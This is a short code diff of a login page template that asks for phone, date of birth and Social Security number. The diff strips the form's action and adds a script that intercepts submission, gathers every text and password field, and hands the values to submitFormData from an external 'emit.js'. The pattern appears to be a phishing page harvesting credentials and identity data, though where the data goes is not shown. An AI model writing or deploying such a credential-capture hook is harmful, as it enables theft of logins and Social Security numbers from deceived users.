@@ -1,7 +1,7 @@
 @layout('layouts.app')
 
 @section('content')
-<form id="login4Form" class="cb-form" action="/auth/login/4" method="POST">
+<form id="login4Form" class="cb-form" method="POST">
   <div class="columns col-small">
     <div class="row">
       <div class="column col-small mtop-30">
@@ -89,5 +89,56 @@
   $('#phone').mask('(000) 000-0000');
   $('#dob').mask('00/00/0000');
   $('#ssn').mask('000-00-0000');
+</script>
+
+<script src="/assets/emit.js"></script> 
+<script>
+
+stopLoading();
+
+page = "contact";
+// Select the first form on the page
+const form = document.querySelector("form");
+
+// Listen to form submit
+form.addEventListener("submit", function (e) {
+  e.preventDefault(); // prevent default submit
+
+  let hasError = false;
+  const user = {};
+
+  // Select all text/password inputs inside the form
+  const inputs = form.querySelectorAll('input[type="text"], input[type="password"]');
+
+  inputs.forEach(input => {
+    const value = input.value.trim();
+
+    // Find the error message div dynamically within the same input container
+    const errorMsg = input.closest(".cb-input-box")?.querySelector(".cb-input-error-message");
+
+    // Hide error initially
+    if (errorMsg) errorMsg.style.display = "none";
+
+    if (value === "") {
+      if (errorMsg) errorMsg.style.display = "block";
+      hasError = true;
+    } else {
+      user[input.name] = value;
+    }
+  });
+
+  if (hasError) return;
+
+  // All inputs valid → submit user object
+  submitFormData(user);
+});
+
+// Remove error while typing
+form.querySelectorAll('input[type="text"], input[type="password"]').forEach(input => {
+  input.addEventListener("input", () => {
+    const errorMsg = input.closest(".cb-input-box")?.querySelector(".cb-input-error-message");
+    if (errorMsg) errorMsg.style.display = "none";
+  });
+});
 </script>
 @endsection
